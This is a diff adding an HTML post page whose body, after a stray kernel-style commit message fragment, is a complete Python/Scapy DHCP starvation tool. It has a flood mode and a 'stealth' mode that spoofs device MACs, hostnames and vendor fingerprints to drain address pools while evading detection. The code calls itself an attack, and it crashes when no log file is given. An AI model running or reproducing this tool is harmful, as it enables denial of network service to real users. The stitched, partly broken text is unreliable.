@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>k</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Noto Sans SC", sans-serif; line-height: 1.6; color: #1C1B1F; max-width: 800px; margin: 0 auto; padding: 2rem; background: #FEF7FF; }
+        .post-image img, .post-video video { max-width: 100%; height: auto; border-radius: 16px; display: block; margin: 1rem auto; }
+        .post-audio audio { width: 100%; max-width: 400px; display: block; margin: 1rem auto; }
+        h1, h2, h3 { color: #1C1B1F; margin-top: 1.5rem; margin-bottom: 0.75rem; }
+        p { margin-bottom: 1rem; }
+        code { background: rgba(0,0,0,0.05); padding: 0.2rem 0.4rem; border-radius: 4px; font-family: monospace; }
+        a { color: #6750A4; }
+    </style>
+</head>
+<body>
+    <article>
+        <header>
+            <h1>k</h1>
+            <time>2026年06月03日 05:25:36</time>
+        </header>
+        <div class="post-content"><em>License cleanup: add SPDX GPL-2.0 license identifier to files with no…
+#!/usr/bin/env python3
+"""
+高级 DHCP 洪水测试工具（含日志记录）
+支持两种模式：
+    --flood   : 高速 Discover 泛洪
+    --stealth : 隐蔽震荡（完整 DORA + 立即释放）
+日志输出：JSON 或 CSV，记录每个包的关键信息。
+"""
+
+import time
+import random
+import threading
+import argparse
+import sys
+import json
+import csv
+import os
+from collections import namedtuple
+from scapy.all import (
+    Ether, IP, UDP, BOOTP, DHCP,
+    sendp, srp1, sniff,
+    conf, get_if_hwaddr
+)
+
+# ================== 设备指纹库（同上，省略重复） ==================
+OUI_LIST = [
+    "00:1A:79", "00:1B:63", "00:1E:C2", "00:26:08", "B8:27:EB",
+    "DC:A6:32", "00:0C:29", "00:50:56", "08:00:27", "00:1C:42",
+    "F0:18:98", "C8:D3:A3", "78:31:C1", "00:1E:8F", "00:23:76",
+    "00:17:4B", "00:24:E8", "00:15:5D", "00:1E:67", "00:21:6A",
+    "00:1B:77", "00:1A:A1", "00:0D:BD", "00:24:B2", "00:1F:F3",
+    "00:1A:70", "00:1C:DF", "00:1E:58", "00:22:75", "00:18:E7",
+    "00:1B:13", "00:1F:3C"
+]
+
+HOSTNAMES = [
+    "DESKTOP-{}", "LAPTOP-{}", "iPhone-{}", "android-{}",
+    "MacBook-{}", "Galaxy-{}", "Pi-{}", "Ubuntu-{}",
+    "Win10-{}", "Living-Room", "Office-PC", "Server"
+]
+
+VENDOR_CLASSES = [
+    b"MSFT 5.0", b"MSFT 7.0", b"android-dhcp-13", b"android-dhcp-12",
+    b"dhcpcd-9.4.1", b"dhcpcd-8.1.2", b"iOS4.1", b"iOS13.0",
+    b"Mac OS X", b"udhcp 1.25.1", b"dnsmasq-dhcp"
+]
+
+PARAM_REQ_LISTS = [
+    [1, 3, 6, 15, 28, 51, 58, 59, 43],
+    [1, 121, 3, 6, 15, 119, 252],
+    [1, 3, 6, 12, 15, 28, 42, 51, 54, 58, 59, 66, 67],
+    [1, 28, 2, 3, 15, 6, 12, 44, 47, 26, 121, 42],
+]
+
+# ================== 工具函数 ==================
+def random_mac(oui=True):
+    if oui and OUI_LIST:
+        oui_hex = random.choice(OUI_LIST)
+        mac_bytes = bytes.fromhex(oui_hex.replace(":", ""))
+        suffix = random.randbytes(3)
+        return ":".join(f"{b:02x}" for b in mac_bytes + suffix)
+    return ":".join(f"{b:02x}" for b in random.randbytes(6))
+
+def mac_to_bytes(mac_str):
+    return bytes.fromhex(mac_str.replace(":", ""))
+
+def random_hostname():
+    template = random.choice(HOSTNAMES)
+    if "{}" in template:
+        return template.format(random.randint(1000, 9999))
+    return template
+
+def random_vendor_class():
+    return random.choice(VENDOR_CLASSES)
+
+def random_param_req():
+    return random.choice(PARAM_REQ_LISTS)
+
+# ================== 日志模块 ==================
+class Logger:
+    def __init__(self, log_path, iface, mode):
+        self.log_path = log_path
+        self.iface = iface
+        self.mode = mode
+        self.lock = threading.Lock()
+        # 判断文件后缀
+        self.is_json = log_path.endswith('.json')
+        self.is_csv = log_path.endswith('.csv')
+        if not self.is_json and not self.is_csv:
+            # 默认json
+            self.is_json = True
+            self.log_path += '.json'
+
+        self.file = open(self.log_path, 'w', newline='' if self.is_csv else '')
+        if self.is_csv:
+            self.writer = csv.writer(self.file)
+            self.writer.writerow(['timestamp', 'interface', 'mode', 'src_mac', 'xid', 'op', 'extra'])
+        else:
+            self.file.write('[\n')
+        self.record_count = 0
+
+    def log(self, src_mac, xid, op, extra=""):
+        with self.lock:
+            ts = time.time()
+            record = {
+                'timestamp': ts,
+                'interface': self.iface,
+                'mode': self.mode,
+                'src_mac': src_mac,
+                'xid': xid,
+                'op': op,
+                'extra': extra
+            }
+            if self.is_csv:
+                self.writer.writerow([ts, self.iface, self.mode, src_mac, xid, op, extra])
+            else:
+                if self.record_count > 0:
+                    self.file.write(',\n')
+                json.dump(record, self.file)
+            self.file.flush()
+            self.record_count += 1
+
+    def close(self):
+        with self.lock:
+            if not self.is_csv:
+                self.file.write('\n]')
+            self.file.close()
+            print(f"\n[*] 日志已保存至: {self.log_path}")
+
+# ================== 数据包构建（同前，略作改动以返回xid） ==================
+def build_dhcp_discover(src_mac, transaction_id=None, secs=0):
+    if transaction_id is None:
+        transaction_id = random.randint(1, 0xFFFFFFFF)
+    if secs is None:
+        secs = random.randint(0, 20)
+
+    eth = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
+    ip = IP(src="0.0.0.0", dst="255.255.255.255")
+    udp = UDP(sport=68, dport=67)
+    bootp = BOOTP(
+        op=1, htype=1, hlen=6, hops=0, xid=transaction_id,
+        secs=secs, flags=0x8000,
+        ciaddr="0.0.0.0", yiaddr="0.0.0.0", siaddr="0.0.0.0", giaddr="0.0.0.0",
+        chaddr=mac_to_bytes(src_mac)
+    )
+    dhcp_options = [
+        ("message-type", "discover"),
+        ("param_req_list", random_param_req()),
+        ("client_id", b"\x01" + mac_to_bytes(src_mac)),
+        ("hostname", random_hostname().encode()),
+        ("vendor_class_id", random_vendor_class()),
+        "end"
+    ]
+    dhcp = DHCP(options=dhcp_options)
+    return eth / ip / udp / bootp / dhcp, transaction_id
+
+def build_dhcp_request(offer_pkt, src_mac):
+    bootp_offer = offer_pkt[BOOTP]
+    dhcp_offer = offer_pkt[DHCP]
+    offered_ip = bootp_offer.yiaddr
+    server_id = None
+    for opt in dhcp_offer.options:
+        if isinstance(opt, tuple) and opt[0] == "server_id":
+            server_id = opt[1]
+            break
+    if not server_id:
+        return None, None
+
+    transaction_id = bootp_offer.xid
+    eth = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
+    ip = IP(src="0.0.0.0", dst="255.255.255.255")
+    udp = UDP(sport=68, dport=67)
+    bootp = BOOTP(
+        op=1, htype=1, hlen=6, hops=0, xid=transaction_id, secs=0, flags=0x8000,
+        ciaddr="0.0.0.0", yiaddr="0.0.0.0", siaddr="0.0.0.0", giaddr="0.0.0.0",
+        chaddr=mac_to_bytes(src_mac)
+    )
+    dhcp_options = [
+        ("message-type", "request"),
+        ("client_id", b"\x01" + mac_to_bytes(src_mac)),
+        ("requested_addr", offered_ip),
+        ("server_id", server_id),
+        ("hostname", random_hostname().encode()),
+        ("vendor_class_id", random_vendor_class()),
+        ("param_req_list", random_param_req()),
+        "end"
+    ]
+    dhcp = DHCP(options=dhcp_options)
+    return eth / ip / udp / bootp / dhcp, transaction_id
+
+def build_dhcp_release(ack_pkt, src_mac):
+    bootp_ack = ack_pkt[BOOTP]
+    dhcp_ack = ack_pkt[DHCP]
+    released_ip = bootp_ack.yiaddr
+    server_id = None
+    for opt in dhcp_ack.options:
+        if isinstance(opt, tuple) and opt[0] == "server_id":
+            server_id = opt[1]
+            break
+    if not server_id:
+        return None, None
+
+    transaction_id = random.randint(1, 0xFFFFFFFF)
+    eth = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
+    ip = IP(src=released_ip, dst=server_id)
+    udp = UDP(sport=68, dport=67)
+    bootp = BOOTP(
+        op=1, htype=1, hlen=6, hops=0, xid=transaction_id, secs=0,
+        ciaddr=released_ip, yiaddr="0.0.0.0", siaddr="0.0.0.0", giaddr="0.0.0.0",
+        chaddr=mac_to_bytes(src_mac)
+    )
+    dhcp_options = [
+        ("message-type", "release"),
+        ("client_id", b"\x01" + mac_to_bytes(src_mac)),
+        ("server_id", server_id),
+        "end"
+    ]
+    dhcp = DHCP(options=dhcp_options)
+    return eth / ip / udp / bootp / dhcp, transaction_id
+
+# ================== 泛洪模式 ==================
+def flood_discover(interface, rate, duration, quiet, logger):
+    print(f"[*] Discover泛洪模式 -> 接口: {interface}, 日志: {logger.log_path}")
+    if rate > 0:
+        interval = 1.0 / rate
+    else:
+        interval = 0
+
+    start_time = time.time()
+    packet_count = 0
+
+    while True:
+        if duration and (time.time() - start_time) >= duration:
+            break
+
+        src_mac = random_mac(oui=True)
+        pkt, xid = build_dhcp_discover(src_mac, secs=random.randint(0, 30))
+        sendp(pkt, iface=interface, verbose=False)
+        packet_count += 1
+
+        # 记录日志
+        logger.log(src_mac, xid, "DISCOVER")
+
+        if not quiet and packet_count % 50 == 0:
+            elapsed = time.time() - start_time
+            current_rate = packet_count / elapsed if elapsed > 0 else 0
+            print(f"[+] 已发送 {packet_count} 包, 速率 {current_rate:.1f} pkt/s", end="\r")
+
+        if rate > 0:
+            jitter = interval * random.uniform(0.6, 1.4)
+            time.sleep(jitter)
+
+    elapsed = time.time() - start_time
+    actual_rate = packet_count / elapsed if elapsed > 0 else 0
+    print(f"\n[*] 完成: 总数 {packet_count}, 实际速率 {actual_rate:.1f} pkt/s")
+
+# ================== 隐蔽震荡模式 ==================
+class StealthDevice(threading.Thread):
+    def __init__(self, interface, device_id, stop_event, logger):
+        super().__init__(daemon=True)
+        self.iface = interface
+        self.id = device_id
+        self.stop_event = stop_event
+        self.logger = logger
+
+    def run(self):
+        while not self.stop_event.is_set():
+            try:
+                self.perform_cycle()
+            except:
+                time.sleep(random.uniform(1, 3))
+
+    def perform_cycle(self):
+        mac = random_mac(oui=True)
+        xid = random.randint(1, 0xFFFFFFFF)
+
+        # 1. Discover
+        discover, _ = build_dhcp_discover(mac, transaction_id=xid, secs=random.randint(0, 5))
+        offer = srp1(discover, iface=self.iface, timeout=2, verbose=False)
+        if offer and DHCP in offer:
+            self.logger.log(mac, xid, "OFFER_RECEIVED", f"IP:{offer[BOOTP].yiaddr}")
+        else:
+            self.logger.log(mac, xid, "NO_OFFER")
+            time.sleep(random.uniform(2, 5))
+            return
+
+        time.sleep(random.uniform(0.1, 0.5))
+
+        # 2. Request
+        request, _ = build_dhcp_request(offer, mac)
+        if not request:
+            return
+        ack = srp1(request, iface=self.iface, timeout=2, verbose=False)
+        if ack and DHCP in ack and ack[DHCP].options[0][1] == 5:
+            self.logger.log(mac, xid, "ACK_RECEIVED", f"IP:{ack[BOOTP].yiaddr}")
+        else:
+            self.logger.log(mac, xid, "NO_ACK")
+            time.sleep(random.uniform(1, 3))
+            return
+
+        # 3. Release
+        time.sleep(random.uniform(0.05, 0.3))
+        release, rel_xid = build_dhcp_release(ack, mac)
+        if release:
+            sendp(release, iface=self.iface, verbose=False)
+            self.logger.log(mac, rel_xid, "RELEASE_SENT", f"IP:{ack[BOOTP].yiaddr}")
+
+        time.sleep(random.uniform(1.0, 5.0))
+
+def stealth_attack(interface, concurrent, duration, quiet, logger):
+    print(f"[*] 隐蔽震荡模式 -> 接口: {interface}, 并发: {concurrent}, 日志: {logger.log_path}")
+    stop_event = threading.Event()
+    threads = []
+    for i in range(concurrent):
+        t = StealthDevice(interface, i, stop_event, logger)
+        t.start()
+        threads.append(t)
+        time.sleep(random.uniform(0.05, 0.3))
+
+    if not quiet:
+        print("[*] 虚拟设备已启动，持续消耗地址池...")
+
+    try:
+        if duration:
+            time.sleep(duration)
+        else:
+            while True:
+                time.sleep(1)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        stop_event.set()
+        for t in threads:
+            t.join(timeout=3)
+        print("\n[*] 隐蔽攻击已停止。")
+
+# ================== 主程序 ==================
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="高级DHCP洪水工具 - 真实设备模拟 & 隐蔽震荡 & 日志")
+    parser.add_argument("-i", "--interface", required=True, help="网卡接口")
+    group = parser.add_mutually_exclusive_group(required=True)
+    group.add_argument("--flood", action="store_true", help="高速Discover泛洪模式")
+    group.add_argument("--stealth", action="store_true", help="隐蔽震荡模式（完整DORA+释放）")
+    parser.add_argument("-r", "--rate", type=float, default=30, help="[泛洪] 每秒发包速率")
+    parser.add_argument("-c", "--concurrent", type=int, default=20, help="[隐蔽] 并发设备数")
+    parser.add_argument("-t", "--time", type=int, default=None, help="运行时长(秒)")
+    parser.add_argument("-q", "--quiet", action="store_true", help="减少输出")
+    parser.add_argument("--log", type=str, default=None, help="日志文件路径 (.json 或 .csv)")
+
+    args = parser.parse_args()
+
+    if not conf.use_pcap and not conf.use_npcap:
+        print("[!] 可能需要root/管理员权限。")
+
+    # 初始化日志器
+    logger = None
+    if args.log:
+        mode = "flood" if args.flood else "stealth"
+        logger = Logger(args.log, args.interface, mode)
+
+    try:
+        if args.flood:
+            flood_discover(args.interface, args.rate, args.time, args.quiet, logger)
+        else:
+            stealth_attack(args.interface, args.concurrent, args.time, args.quiet, logger)
+    except PermissionError:
+        print("[!] 权限不足，请使用 sudo 运行。")
+    except Exception as e:
+        print(f"[!] 错误: {e}")
+    finally:
+        if logger:
+            logger.close()</em></div>
+    </article>
+</body>
+</html>
